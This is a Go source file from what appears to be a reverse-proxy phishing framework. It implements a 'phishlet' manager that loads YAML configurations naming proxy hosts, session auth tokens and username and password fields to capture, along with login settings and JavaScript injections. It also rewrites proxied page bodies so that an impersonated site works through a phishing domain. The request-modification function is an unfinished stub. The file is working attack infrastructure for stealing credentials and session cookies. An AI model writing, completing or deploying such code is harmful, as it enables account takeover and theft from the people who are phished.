// Package proxy - Phishlet Manager
package proxy

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"sync"

	"github.com/gofiber/fiber/v2"
	"go.uber.org/zap"
	"gopkg.in/yaml.v3"
)

// Phishlet конфигурация фишлета
type Phishlet struct {
	ID          string        `yaml:"id"`
	Author      string        `yaml:"author"`
	Description string        `yaml:"description"`
	ProxyHosts  []ProxyHost   `yaml:"proxy_hosts"`
	SubFilters  []SubFilter   `yaml:"sub_filters"`
	AuthTokens  []AuthToken   `yaml:"auth_tokens"`
	Credentials CredConfig    `yaml:"credentials"`
	AuthURLs    []string      `yaml:"auth_urls"`
	Login       LoginConfig   `yaml:"login"`
	JSInjections []JSInjection `yaml:"js_inject"`
	Enabled     bool          `yaml:"enabled"`
}

// ProxyHost хост для проксирования
type ProxyHost struct {
	PhishSub  string `yaml:"phish_sub"`
	OrigSub   string `yaml:"orig_sub"`
	Domain    string `yaml:"domain"`
	Session   bool   `yaml:"session"`
	IsLanding bool   `yaml:"is_landing"`
}

// SubFilter фильтр для замены
type SubFilter struct {
	TriggersOn   string   `yaml:"triggers_on"`
	OrigSub      string   `yaml:"orig_sub"`
	Domain       string   `yaml:"domain"`
	Search       string   `yaml:"search"`
	Replace      string   `yaml:"replace"`
	Mimes        []string `yaml:"mimes"`
	RedirectOnly bool     `yaml:"redirect_only"`
	regex        *regexp.Regexp
}

// AuthToken токен аутентификации
type AuthToken struct {
	Domain string   `yaml:"domain"`
	Keys   []string `yaml:"keys"`
}

// CredConfig конфигурация креденшалов
type CredConfig struct {
	Username []FieldRule `yaml:"username"`
	Password []FieldRule `yaml:"password"`
	Custom   []FieldRule `yaml:"custom"`
}

// FieldRule правило для поля
type FieldRule struct {
	Key   string `yaml:"key"`
	Value string `yaml:"value"`
}

// LoginConfig конфигурация входа
type LoginConfig struct {
	Domain     string       `yaml:"domain"`
	Path       string       `yaml:"path"`
	Method     string       `yaml:"method"`
	Parameters []ParamRule  `yaml:"parameters"`
}

// ParamRule правило параметра
type ParamRule struct {
	Name  string `yaml:"name"`
	Value string `yaml:"value"`
}

// JSInjection JS инъекция
type JSInjection struct {
	TriggersOn string `yaml:"triggers_on"`
	JS         string `yaml:"js"`
}

// PhishletManager менеджер фишлетов
type PhishletManager struct {
	mu        sync.RWMutex
	logger    *zap.Logger
	phishlets map[string]*Phishlet
	path      string
}

// NewPhishletManager создает менеджер фишлетов
func NewPhishletManager(path string, logger *zap.Logger) *PhishletManager {
	return &PhishletManager{
		logger:    logger,
		phishlets: make(map[string]*Phishlet),
		path:      path,
	}
}

// LoadAll загружает все фишлеты из директории
func (m *PhishletManager) LoadAll() error {
	m.mu.Lock()
	defer m.mu.Unlock()

	files, err := filepath.Glob(filepath.Join(m.path, "*.yaml"))
	if err != nil {
		return err
	}

	loaded := 0
	for _, file := range files {
		if err := m.loadPhishlet(file); err != nil {
			m.logger.Warn("Failed to load phishlet",
				zap.String("file", file),
				zap.Error(err))
			continue
		}
		loaded++
	}

	m.logger.Info("Phishlets loaded", zap.Int("count", loaded))
	return nil
}

// loadPhishlet загружает один фишлет
func (m *PhishletManager) loadPhishlet(file string) error {
	data, err := os.ReadFile(file)
	if err != nil {
		return err
	}

	var phishlet Phishlet
	if err := yaml.Unmarshal(data, &phishlet); err != nil {
		return err
	}

	// Compile regex for sub filters
	for i := range phishlet.SubFilters {
		if phishlet.SubFilters[i].Search != "" {
			re, err := regexp.Compile(phishlet.SubFilters[i].Search)
			if err != nil {
				return fmt.Errorf("invalid regex in sub_filter: %w", err)
			}
			phishlet.SubFilters[i].regex = re
		}
	}

	m.phishlets[phishlet.ID] = &phishlet
	m.logger.Debug("Phishlet loaded", zap.String("id", phishlet.ID))

	return nil
}

// Count возвращает количество загруженных фишлетов
func (m *PhishletManager) Count() int {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return len(m.phishlets)
}

// Get получает фишлет по ID
func (m *PhishletManager) Get(id string) (*Phishlet, error) {
	m.mu.RLock()
	defer m.mu.RUnlock()

	phishlet, ok := m.phishlets[id]
	if !ok {
		return nil, fmt.Errorf("phishlet not found: %s", id)
	}

	return phishlet, nil
}

// Enable включает фишлет
func (m *PhishletManager) Enable(id string) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	phishlet, ok := m.phishlets[id]
	if !ok {
		return fmt.Errorf("phishlet not found: %s", id)
	}

	phishlet.Enabled = true
	m.logger.Info("Phishlet enabled", zap.String("id", id))
	return nil
}

// Disable выключает фишлет
func (m *PhishletManager) Disable(id string) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	phishlet, ok := m.phishlets[id]
	if !ok {
		return fmt.Errorf("phishlet not found: %s", id)
	}

	phishlet.Enabled = false
	m.logger.Info("Phishlet disabled", zap.String("id", id))
	return nil
}

// ModifyRequest модифицирует запрос
func (m *PhishletManager) ModifyRequest(c *fiber.Ctx, sessionID string) error {
	// TODO: Применить правила из фишлета
	return nil
}

// ModifyResponse модифицирует ответ
func (m *PhishletManager) ModifyResponse(resp *http.Response, sessionID string) error {
	m.mu.RLock()
	defer m.mu.RUnlock()

	// Найти активный фишлет
	var activePhishlet *Phishlet
	for _, p := range m.phishlets {
		if p.Enabled {
			activePhishlet = p
			break
		}
	}

	if activePhishlet == nil {
		return nil
	}

	// Применить sub filters
	contentType := resp.Header.Get("Content-Type")
	if !isTextContentType(contentType) {
		return nil
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	modifiedBody := string(body)
	for _, filter := range activePhishlet.SubFilters {
		if filter.regex != nil {
			modifiedBody = filter.regex.ReplaceAllString(modifiedBody, filter.Replace)
		} else {
			modifiedBody = strings.ReplaceAll(modifiedBody, filter.Search, filter.Replace)
		}
	}

	// Перезаписать тело ответа
	resp.Body = io.NopCloser(strings.NewReader(modifiedBody))
	resp.ContentLength = int64(len(modifiedBody))
	resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(modifiedBody)))

	return nil
}

// List возвращает список фишлетов
func (m *PhishletManager) List() []*Phishlet {
	m.mu.RLock()
	defer m.mu.RUnlock()

	list := make([]*Phishlet, 0, len(m.phishlets))
	for _, p := range m.phishlets {
		list = append(list, p)
	}
	return list
}

// ExportJSON экспортирует фишлеты в JSON
func (m *PhishletManager) ExportJSON() ([]byte, error) {
	m.mu.RLock()
	defer m.mu.RUnlock()

	return json.Marshal(m.phishlets)
}
